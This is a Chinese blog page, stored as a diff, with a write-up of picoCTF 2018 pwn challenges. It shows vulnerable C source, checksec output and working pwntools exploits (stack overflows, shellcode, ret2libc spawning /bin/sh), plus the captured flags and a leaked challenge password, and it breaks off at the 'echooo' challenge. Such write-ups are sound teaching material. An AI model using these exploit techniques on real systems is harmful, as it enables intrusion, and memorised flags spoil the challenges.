@@ -1,0 +1,2214 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  
+  <title itemprop="name">picoCTFのpwn解析 | nepire的舰队</title>
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
+  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
+  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/lib.min.css" media="all">
+  <link rel="stylesheet" href="/css/font.css" media="all">
+  <link rel="stylesheet" href="/css/insight.css" media="all">
+  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
+  <link rel="stylesheet" href="/css/zoom.css" media="all">
+  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
+" type="text/css" media="all"> -->
+  <script>
+  /*Initial Variables*/
+  var mashiro_option = new Object();
+  var mashiro_global = new Object();
+  mashiro_option.NProgressON = true;
+  /* 
+   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
+   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
+   */
+  mashiro_option.email_domain = "";
+  mashiro_option.email_name = "";
+  mashiro_option.cookie_version_control = "";
+  mashiro_option.qzone_autocomplete = false;
+  mashiro_option.site_name = "艦隊nepire";
+  mashiro_option.author_name = "nepire";
+  mashiro_option.site_url = "https://nepire.github.io/";
+  mashiro_option.v_appId = "aAE6NeF5HCQ0WM9kYD4ywdDw-gzGzoHsz";
+  mashiro_option.v_appKey = "EEpyRysaKmv7aOJjR1o9E4Eq";
+  mashiro_option.mathjax = "0";
+  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
+  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";
+
+  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
+  // mashiro_option.float_player_on = true;
+
+  /*End of Initial Variables*/
+  </script>
+  <script type="text/javascript">
+  var bg = "/images/cover/(0).jpg,/images/cover/(1).jpg,/images/cover/(2).jpg,/images/cover/(3).jpg".split(",");
+  var bgindex = Math.floor(Math.random()*bg.length);
+  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
+    alert('朋友，IE浏览器未适配哦~');
+  }
+  </script>
+  <style type="text/css">
+  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
+  </style>
+  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
+  </style>
+</head>
+</html>
+<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
+  <div class="scrollbar" id="bar">
+  </div>
+  <a href="#" class="cd-top faa-float animated"></a>
+  <section id="main-container">
+    <div class="headertop filter-dot">
+  <div id="banner_wave_1"></div>
+  <div id="banner_wave_2"></div>
+  <figure id="centerbg" class="centerbg">
+    <div class="focusinfo no-select">
+      <div class="header-tou">
+        <a href="https://nepire.github.io/">
+          <img src="/images/title.ico">
+        </a>
+      </div>
+      <div class="header-info">
+        <p>渴求着能撼动世界的力量</p>
+        <div class="top-social_v2">
+          <li id="bg-pre">
+            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+          
+            
+              
+                <li>
+                  <a href="https://github.com/Nepire" target="_blank" class="social-github" title="github">
+                    <img src="/images/social/github.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="https://github.com/Nepire" target="_blank" class="social-github" title="sina">
+                    <img src="/images/social/sina.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="https://github.com/Nepire" target="_blank" class="social-github" title="wangyiyun">
+                    <img src="/images/social/wangyiyun.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="https://github.com/Nepire" target="_blank" class="social-github" title="zhihu">
+                    <img src="/images/social/zhihu.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="https://github.com/Nepire" target="_blank" class="social-github" title="email">
+                    <img src="/images/social/email.svg">
+                  </a>
+                </li>
+              
+            
+              
+                <li class="wechat">
+                  <a href="/#">
+                    <img src="/images/social/wechat.png">
+                  </a>
+                  <div class="wechatInner">
+                    <img src="/img/custom/wechat.jpg">
+                  </div>
+                </li>
+              
+            
+          
+          <li id="bg-next">
+            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+        </div>
+      </div>
+    </div>
+  </figure>
+  <div id="video-container" style="">
+    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
+    </video>
+    <div id="video-btn" class="loadvideo videolive">
+    </div>
+    <div id="video-add">
+    </div>
+    <div class="video-stu">
+    </div>
+  </div>
+  <div class="headertop-down faa-float animated" onclick="headertop_down()">
+    <span>
+      <i class="fa fa-chevron-down" aria-hidden="true">
+      </i>
+    </span>
+  </div>
+</div>
+    <div id="page" class="site wrapper">
+      <header class="site-header no-select gizle sabit" role="banner">
+  <div class="site-top">
+    <div class="site-branding">
+      <span class="site-title">
+        <span class="logolink moe-mashiro">
+          <a href="/">
+            <span class="sakurasono">艦隊</span>
+            <span class="shironeko">nepire</span>
+          </a>
+        </span>
+      </span>
+    </div>
+    <div class="searchbox search-form-submit">
+      <i class="iconfont js-toggle-search iconsearch icon-search">
+      </i>
+    </div>
+    <div id="show-nav" class="showNav mobile-fit">
+      <div class="line line1">
+      </div>
+      <div class="line line2">
+      </div>
+      <div class="line line3">
+      </div>
+    </div>
+    <div class="lower-cantiner">
+      <div class="lower">
+        <nav class="mobile-fit-control hide">
+          <ul id="menu-new" class="menu">
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+                    首页
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+                    归档
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/categories/技术/">
+                          <i class="fa fa-code" aria-hidden="true"></i>
+                          技术
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/生活/">
+                          <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                          生活
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/资源/">
+                          <i class="fa fa-cloud-download" aria-hidden="true"></i>
+                          资源
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="javascript:;">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+                    清单
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/tags/悦读/">
+                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                          书单
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/bangumi/">
+                          <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
+                          番组
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/music/">
+                          <i class="fa fa-headphones" aria-hidden="true"></i>
+                          歌单
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/tags/图集/">
+                          <i class="fa fa-photo" aria-hidden="true"></i>
+                          图集
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="/comment/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
+                    留言板
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/links/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
+                    友人帐
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/donate/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
+                    赞赏
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+                    关于
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/about/">
+                          <i class="fa fa-meetup" aria-hidden="true"></i>
+                          我？
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/theme-sakura/">
+                          <i class="fa iconfont icon-sakura" aria-hidden="true"></i>
+                          主题
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/lab/">
+                          <i class="fa fa-cogs" aria-hidden="true"></i>
+                          Lab
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="/client/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-android faa-vertical" aria-hidden="true"></i>
+                    客户端
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/atom.xml">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
+                    RSS
+                  </span>
+                </a>
+                
+              </li>
+            
+          </ul>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://p2.ssl.qhimg.com/t01f20b1ea3950aa6f6.jpg);" src="" data-src="https://p2.ssl.qhimg.com/t01f20b1ea3950aa6f6.jpg">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      picoCTFのpwn解析</h1>
+      <p class="entry-census">
+        <span>
+          <a href="https://nepire.github.io/">
+            <img src="/images/title.ico">
+          </a>
+        </span>
+        <span>
+          <a href="https://nepire.github.io/">nepire</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2019-11-5<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
+  </div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <p>国庆期间得知了美国CMU主办的picoCTF比赛，出于最近做题的手感有所下降，借此比赛来复习下PWN相关的题型（题目的质量不错，而且题型很广，自我感觉相当棒的比赛）</p>
+<p>本文首发于<a href="https://www.anquanke.com/post/id/161843" target="_blank" rel="noopener">安全客—picoCTFのpwn解析</a></p>
+<h3 id="buffer-overflow-0"><a href="#buffer-overflow-0" class="headerlink" title="buffer overflow 0"></a>buffer overflow 0</h3><p>先检查一遍文件</p>
+<pre><code class="bash">➜  bufferoverflow0 file vuln
+vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e1e24cdf757acbd04d095e531a40d044abed7e82, not stripped
+➜  bufferoverflow0 checksec vuln
+[*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow0/vuln&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<p>由于这题给了源码所以我们直接看源码</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;signal.h&gt;
+
+#define FLAGSIZE_MAX 64
+
+char flag[FLAGSIZE_MAX];
+
+void sigsegv_handler(int sig) {
+  fprintf(stderr, &quot;%s\n&quot;, flag);
+  fflush(stderr);
+  exit(1);
+}
+
+void vuln(char *input){
+  char buf[16];
+  strcpy(buf, input);// !stackoverflow
+}
+
+int main(int argc, char **argv){
+
+  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
+  if (f == NULL) {
+    printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;);
+    exit(0);
+  }
+  fgets(flag,FLAGSIZE_MAX,f);
+  signal(SIGSEGV, sigsegv_handler);
+
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  if (argc &gt; 1) {
+    vuln(argv[1]);
+    printf(&quot;Thanks! Received: %s&quot;, argv[1]);
+  }
+  else
+    printf(&quot;This program takes 1 argument.\n&quot;);
+  return 0;
+}
+</code></pre>
+<p>不难看出传入的参数没有限制大小造成在vuln函数里面strcpy至buf时可能导致栈溢出，而这题只要将程序执行流劫持到sigsegv_handler函数就可以读flag，直接放exp</p>
+<p>EXP</p>
+<pre><code class="python">from pwn import*
+context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;)
+elf = ELF(&#39;./vuln&#39;)
+
+flag_addr = 0x804a080
+puts_plt = elf.plt[&#39;puts&#39;]
+buf = &#39;a&#39;*0x18
+
+payload  = buf + &#39;aaaa&#39;
+payload += p32(puts_plt) + &#39;aaaa&#39; + p32(flag_addr)
+n = process(argv=[&#39;./vuln&#39;, payload])
+
+n.interactive()
+</code></pre>
+<p>FLAG</p>
+<pre><code>picoCTF{ov3rfl0ws_ar3nt_that_bad_a54b012c}
+</code></pre><h3 id="buffer-overflow-1"><a href="#buffer-overflow-1" class="headerlink" title="buffer overflow 1"></a>buffer overflow 1</h3><p>检查一遍文件</p>
+<pre><code class="bash">➜  bufferoverflow1 file vuln
+vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=98eac1e5bfaa95437b28e069a343f3c3a7b9e800, not stripped
+➜  bufferoverflow1 checksec vuln
+[*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow1/vuln&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+</code></pre>
+<p>全都没开，大胆猜测是要我们写shellcode，看源码确认一波</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &quot;asm.h&quot;
+
+#define BUFSIZE 32
+#define FLAGSIZE 64
+
+void win() {
+  char buf[FLAGSIZE];
+  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
+  if (f == NULL) {
+    printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;);
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  printf(buf);
+}
+
+void vuln(){
+  char buf[BUFSIZE];
+  gets(buf);
+
+  printf(&quot;Okay, time to return... Fingers Crossed... Jumping to 0x%x\n&quot;, get_return_address());
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  puts(&quot;Please enter your string: &quot;);
+  vuln();
+  return 0;
+}
+</code></pre>
+<p>emmmm……看起来是可以用ret2shellcode但感觉有点麻烦，所以就简单套路直接溢出后劫持返回地址为win函数直接getflag</p>
+<p>EXP</p>
+<pre><code class="python">from pwn import*
+context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;)
+n = process(&#39;./vuln&#39;)
+elf = ELF(&#39;./vuln&#39;)
+
+buf = 0x28
+win_addr = 0x080485CB
+
+payload = &#39;a&#39;*buf + &#39;aaaa&#39; + p32(win_addr)
+n.sendline(payload)
+
+n.interactive()
+</code></pre>
+<p>FLAG</p>
+<pre><code class="&#39;">picoCTF{addr3ss3s_ar3_3asy14941911}
+</code></pre>
+<h3 id="leak-me"><a href="#leak-me" class="headerlink" title="leak-me"></a>leak-me</h3><pre><code class="bash">➜  leak-me file auth
+auth: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c69a8024075d10a44fe028c410f5a06580bd3d82, not stripped
+➜  leak-me checksec auth
+[*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/leak-me/auth&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<p>看源码分析一下程序的主要功能</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+int flag() {
+  char flag[48];
+  FILE *file;
+  file = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
+  if (file == NULL) {
+    printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;);
+    exit(0);
+  }
+
+  fgets(flag, sizeof(flag), file);
+  printf(&quot;%s&quot;, flag);
+  return 0;
+}
+
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  // Set the gid to the effective gid
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  // real pw:
+  FILE *file;
+  char password[64];
+  char name[256];
+  char password_input[64];
+
+  memset(password, 0, sizeof(password));
+  memset(name, 0, sizeof(name));
+  memset(password_input, 0, sizeof(password_input));
+
+  printf(&quot;What is your name?\n&quot;);
+
+  fgets(name, sizeof(name), stdin);
+  char *end = strchr(name, &#39;\n&#39;);    //name=&#39;a&#39;*0x100  *end = NULL
+  if (end != NULL)
+  {
+    *end = &#39;\x00&#39;;
+  }
+
+  strcat(name, &quot;,\nPlease Enter the Password.&quot;);
+
+  file = fopen(&quot;password.txt&quot;, &quot;r&quot;);
+  if (file == NULL)
+  {
+    printf(&quot;Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;);
+    exit(0);
+  }
+
+  fgets(password, sizeof(password), file);
+
+  printf(&quot;Hello &quot;);
+  puts(name);
+
+  fgets(password_input, sizeof(password_input), stdin);
+  password_input[sizeof(password_input)] = &#39;\x00&#39;;
+
+  if (!strcmp(password_input, password))
+  {
+    flag();
+  }
+  else
+  {
+    printf(&quot;Incorrect Password!\n&quot;);
+  }
+  return 0;
+}
+</code></pre>
+<p>我们可以看到存在一个很经典的栅栏错误类型的off-by-one漏洞，当name输入为‘a’* 0x100 时栈上的结构会如下图所示</p>
+<p><img src="https://raw.githubusercontent.com/Nepire/Nepire.github.io/master/_posts/%E6%8A%95%E7%A8%BF__picoCTF%E3%81%AEpwn%E8%A7%A3%E6%9E%90.assets/1538755631158.png" alt="1538755631158"></p>
+<p>我们知道puts是根据’\x00’来判断字符串的末端来输出，根据程序逻辑正常的情况下应该是像左图一样是以’\n’为结尾的字符串，然后通过源代码43—47行来将’\n’替换成’\x00’使得puts(name)能正确输出输入的name，但如果输入了’a’* 256的话，会导致最后一个’\n’并没有读入而导致程序在puts(name)时会连带下面的password一起输出，这样我们就可以得到服务器上的password为</p>
+<pre><code>a_reAllY_s3cuRe_p4s$word_f85406
+</code></pre><p>然后直接连服务器，输入长度小于256的name和leak出来的password就能直接拿到flag</p>
+<p>FLAG</p>
+<pre><code>picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_0f7ec3c0}
+</code></pre><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><pre><code class="bash">➜  shellcode file vuln
+vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=fdba7cd36e043609da623c330a501f920470b49a, not stripped
+➜  shellcode checksec vuln
+[*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/shellcode/vuln&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+</code></pre>
+<p>emmmm……防护机制全没开而且题目还叫shellcode，应该错不了是写shellcode了</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+#define BUFSIZE 148
+#define FLAGSIZE 128
+
+void vuln(char *buf){
+  gets(buf);
+  puts(buf);
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  // Set the gid to the effective gid
+  // this prevents /bin/sh from dropping the privileges
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  char buf[BUFSIZE];
+
+  puts(&quot;Enter a string!&quot;);
+  vuln(buf);
+
+  puts(&quot;Thanks! Executing now...&quot;);
+
+  ((void (*)())buf)();
+
+  return 0;
+}
+</code></pre>
+<p>简单审计源码后发现还真是只要写个shellcode就没了，直接给exp</p>
+<p>EXP</p>
+<pre><code class="python">from pwn import*
+context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;)
+n = process(&#39;./vuln&#39;)
+elf = ELF(&#39;./vuln&#39;)
+
+payload = asm(shellcraft.sh())
+
+n.sendline(payload)
+
+n.interactive()
+</code></pre>
+<p>FLAG</p>
+<pre><code>picoCTF{shellc0de_w00h00_7f5a7309}
+</code></pre><h3 id="bufer-overflow2"><a href="#bufer-overflow2" class="headerlink" title="bufer overflow2"></a>bufer overflow2</h3><pre><code class="bash">➜  bufferoverflow2 file vuln
+vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f2f6cce698b62f5109de9955c0ea0ab832ea967c, not stripped
+➜  bufferoverflow2 checksec vuln
+[*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/bufferoverflow2/vuln&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<p>审计一下源码</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+#define BUFSIZE 100
+#define FLAGSIZE 64
+
+void win(unsigned int arg1, unsigned int arg2) {
+  char buf[FLAGSIZE];
+  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
+  if (f == NULL) {
+    printf(&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;);
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  if (arg1 != 0xDEADBEEF)
+    return;
+  if (arg2 != 0xDEADC0DE)
+    return;
+  printf(buf);
+}
+
+void vuln(){
+  char buf[BUFSIZE];
+  gets(buf);
+  puts(buf);
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  puts(&quot;Please enter your string: &quot;);
+  vuln();
+  return 0;
+}
+</code></pre>
+<p>我们很容易理解题目是要我们通过vuln函数里的栈溢出把执行流劫持到win函数，并且要使传入的参数为0xDEADBEEF和0xDEADC0DE，由于是32位程序，所以直接p32(0xDEADBEEF)+p32(0xDEADC0DE)构造ROP来getflag</p>
+<p>EXP</p>
+<pre><code class="python">from pwn import*
+context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;)
+n = process(&#39;./vuln&#39;)
+elf = ELF(&#39;./vuln&#39;)
+
+buf = &#39;a&#39;*0x6c
+win_addr = 0x80485CB
+
+payload = buf + &#39;aaaa&#39; + p32(win_addr)+ &#39;aaaa&#39; + p32(0xDEADBEEF) + p32(0xDEADC0DE)
+n.sendline(payload)
+
+n.interactive()
+</code></pre>
+<p>FLAG</p>
+<pre><code>picoCTF{addr3ss3s_ar3_3asy30833fa1}
+</code></pre><h3 id="got-2-learn-libc"><a href="#got-2-learn-libc" class="headerlink" title="got-2-learn-libc"></a>got-2-learn-libc</h3><pre><code class="bash">➜  got-2-learn-libc file vuln
+vuln: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4e901d4c8bdb0ea8cfd51522376bea63082a2734, not stripped
+➜  got-2-learn-libc checksec vuln
+[*] &#39;/home/Ep3ius/pwn/process/picoCTF2018/got-2-learn-libc/vuln&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre>
+<p>开了PIE，然而看到程序觉得开没开都没差的样子</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+#define BUFSIZE 148
+#define FLAGSIZE 128
+
+char useful_string[16] = &quot;/bin/sh&quot;; /* Maybe this can be used to spawn a shell? */
+
+
+void vuln(){
+  char buf[BUFSIZE];
+  puts(&quot;Enter a string:&quot;);
+  gets(buf);
+  puts(buf);
+  puts(&quot;Thanks! Exiting now...&quot;);
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  // Set the gid to the effective gid
+  // this prevents /bin/sh from dropping the privileges
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+
+  puts(&quot;Here are some useful addresses:\n&quot;);
+
+  printf(&quot;puts: %p\n&quot;, puts);
+  printf(&quot;fflush %p\n&quot;, fflush);
+  printf(&quot;read: %p\n&quot;, read);
+  printf(&quot;write: %p\n&quot;, write);
+  printf(&quot;useful_string: %p\n&quot;, useful_string);
+
+  printf(&quot;\n&quot;);
+
+  vuln();
+
+  return 0;
+}
+</code></pre>
+<p>是的，就是一个简单的ret2libc的应用，通过printf出的地址我们可以得到偏移量，然后去计算system的实际地址，然后把useful_string输出的地址，也就是”/bin/sh”当作参数来构造ROP来执行system(‘/bin/sh’)</p>
+<p>我们先连上题目环境看下文件链接的libc文件的路径</p>
+<pre><code class="bash">Ep3ius@pico-2018-shell-2:/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833$ ldd *
+vuln:
+    linux-gate.so.1 =&gt;  (0xf77c5000)
+    libc.so.6 =&gt; /lib32/libc.so.6 (0xf75ff000)
+    /lib/ld-linux.so.2 (0xf77c6000)
+</code></pre>
+<p>EXP</p>
+<pre><code class="python">from pwn import*
+context(os=&#39;linux&#39;,arch=&#39;i386&#39;,log_level=&#39;debug&#39;)
+n = process(&#39;./vuln&#39;)
+elf = ELF(&#39;./vuln&#39;)
+libc = ELF(&#39;/lib32/libc.so.6&#39;)
+
+buf = &#39;a&#39;*0x9c
+system_sym = libc.symbols[&#39;system&#39;]
+puts_sym = libc.symbols[&#39;puts&#39;]
+
+n.recvuntil(&#39;puts: 0x&#39;)
+puts_addr = int(n.recvuntil(&#39;\n&#39;),16)
+print hex(puts_addr)
+n.recvuntil(&#39;useful_string: &#39;)
+sh_addr = int(n.recvuntil(&#39;\n&#39;),16)
+print hex(sh_addr)
+
+system_addr = (puts_addr - puts_sym) + system_sym
+payload = buf + &#39;aaaa&#39; + p32(system_addr) + &#39;aaaa&#39; + p32(sh_addr)
+n.sendline(payload)
+
+n.interactive()
+</code></pre>
+<h3 id="echooo"><a href="#echooo" class="headerlink" title="echooo"></a>echooo</h3><pre><code class="bash">➜  echooo file echo
